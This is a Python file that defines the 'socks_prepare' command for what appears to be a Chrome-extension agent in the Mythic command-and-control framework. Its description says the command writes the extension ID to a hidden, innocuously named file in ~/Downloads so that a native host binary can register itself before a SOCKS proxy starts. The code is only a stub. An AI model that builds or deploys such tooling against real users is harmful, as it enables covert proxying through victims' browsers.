from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class SocksPrepareArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class SocksPrepareCommand(CommandBase):
    cmd            = "socks_prepare"
    needs_admin    = False
    help_cmd       = "socks_prepare"
    description    = (
        "Write the extension's own ID to ~/Downloads/.svc.dat so the native "
        "host binary can self-register with the correct Chrome allowed_origins. "
        "Run once after deploying the binary, before socks_start."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = SocksPrepareArguments
    parameters     = []
    attackmapping  = ["T1090"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
